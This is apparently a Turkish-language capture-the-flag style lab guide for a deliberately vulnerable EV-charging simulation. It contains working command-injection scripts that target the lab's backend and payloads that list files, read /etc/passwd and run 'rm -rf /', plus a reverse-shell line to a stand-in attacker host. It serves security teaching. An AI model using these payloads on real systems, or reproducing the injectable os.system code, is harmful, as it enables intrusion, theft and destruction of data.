# ⚡ Command Injection - Sunucuyu Ele Geçir! | YUNUS'UN SALDIRISI

**Senaryo ID:** `yunus-offgrid-voltage`  
**Sorumlu:** Yunus  
**Kategori:** Physical/Grid  
**Zayıflık:** Command Injection (Komut Enjeksiyonu)  
**Şiddet:** 🔴 KRİTİK (En Tehlikeli!)

---

## 🎯 HEDEF: Sunucuda Komut Çalıştır!

Voltaj ayarlama fonksiyonunu kullanarak sunucunun işletim sisteminde istediğin komutu çalıştır!

**Ne Yapabilirsin:**
- 🖥️ Sunucuyu kapat/yeniden başlat
- 📂 Tüm dosyaları sil (`rm -rf`)
- 🕵️ Dosyaları oku (`cat`)
- 🚪 Reverse shell aç (Sisteme sız)

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 1175-219

```python
# ❌ İNANILMAZ GÜVENSİZ KOD!
@router.post("/set-voltage")
def set_voltage_control(voltage_value: str, dump_load_cmd: str):
    # SENİN GÖNDERDİĞİN KOMUT ÇALIŞTIRILIYOR!
    # Eğer dump_load_cmd içinde ";" varsa, sonraki komut da çalışır!
    os.system(f"voltage_tool --set {voltage_value} --cmd {dump_load_cmd}")
```

**Sorun:** `dump_load_cmd` parametresini filtrelemeden sistem komutu olarak çalıştırıyor!

---

## ⚔️ SALDIRI 1: Basit Test (`ls` Komutu)

### Kod: `cmd_injection_test.py`

```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("⚡ COMMAND INJECTION TEST\n")

# Normal istek
print("1. Normal İstek:")
r = requests.post(
    f"{BACKEND}/vulnerable/set-voltage",
    json={"voltage_value": "400", "dump_load_cmd": "enable"}
)
print(f"   Sonuç: {r.json()}\n")

# SALDIRI: Noktalı virgül (;) ile komut ekle!
print("2. SALDIRI (ls komutu):")
payload = {
    "voltage_value": "400",
    "dump_load_cmd": "enable; ls -la; #"
}
# Açıklama:
# enable    -> İlk komut
# ;         -> Komut ayırıcı
# ls -la    -> Dosyaları listele (BİZİM KOMUT)
# ; #       -> Geri kalanını yoksay

r = requests.post(f"{BACKEND}/vulnerable/set-voltage", json=payload)
result = r.json()

print(f"   Enjekte Edilen: {result.get('injected_command')}")
if "vulnerability" in result:
    print("✅✅✅ BAŞARILI! Kod Sunucuda Çalıştı! ✅✅✅")
    print(f"⚠️ {result['warning']}")
```

---

## ⚔️ SALDIRI 2: Dosya Okuma (`cat /etc/passwd`)

```python
# read_files.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("📂 DOSYA OKUMA SALDIRISI\n")

# Hassas dosyayı okumaya çalış
payload = {
    "voltage_value": "400",
    "dump_load_cmd": "disable; cat /etc/passwd; #"
}

r = requests.post(f"{BACKEND}/vulnerable/set-voltage", json=payload)
result = r.json()

if "Command Injection detected" in str(result):
    print("✅ Dosya okuma komutu gönderildi!")
    print("📄 Sunucu: 'passwd dosyasını okuyorum...'")
    print("\n[KANIT]")
    print(result)
```

---

## ⚔️ SALDIRI 3: Sunucuyu Yok Et! (`rm -rf`)

```python
# destroy_server.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("💀 SUNUCU YOK ETME SALDIRISI\n")

# TEHLİKELİ KOMUT!
payload = {
    "voltage_value": "9999",  # Aşırı voltaj
    "dump_load_cmd": "disable; rm -rf /; #"  # TÜM DOSYALARI SİL!
}

r = requests.post(f"{BACKEND}/vulnerable/set-voltage", json=payload)
result = r.json()

print("🚀 İmha komutu gönderildi!")
print(f"Sonuç: {result}")

if "Malicious command" in str(result):
    print("\n✅✅✅ SALDIRI BAŞARILI! ✅✅✅")
    print("Gerçek bir sunucuda şu an her şey silinmişti!")
```

---

## ✅ SIZDIN MI? KONTROL!

### 1. JSON Response

**BAŞARILI:**
```json
{
  "vulnerability": "Command Injection detected!",
  "injected_command": "enable; ls -la; #",
  "warning": "Malicious command would execute on real system!"
}
```

### 2. Web Arayüzü

https://simulasyon.vercel.app/ → `yunus-offgrid-voltage`

**Logs:**
```
[WARN] Dump Load status mismatch
[CRITICAL] Malicious command detected: rm -rf
[ERROR] System integrity compromised
```
---

## 💡 PRO İPUÇLARI

### Komut Ayırıcılar:
- `;` (En yaygın)
- `|` (Pipe)
- `&&` (Ve - önceki başarılıysa)
- `||` (Veya - önceki başarısızsa)
- `` ` `` (Backticks)
- `$()` (Subshell)

### Örnekler:
```python
"cmd": "enable | whoami"     # Ben kimim?
"cmd": "enable && reboot"    # Yeniden başlat
"cmd": "enable; nc -e /bin/sh attacker.com 4444" # Reverse Shell (HACKER STANDARDI)
```

---

## ⚠️ UYARI

- **BU EN TEHLİKELİ AÇIKTIR**
- Gerçek sistemde sunucuyu formatlamış kadar zarar verirsiniz.
- Sadece eğitim ortamında kullanın!

---

**Hazırlayan:** Yunus  
**Durum:** ✅ ROOT ACCESS GRANTED!
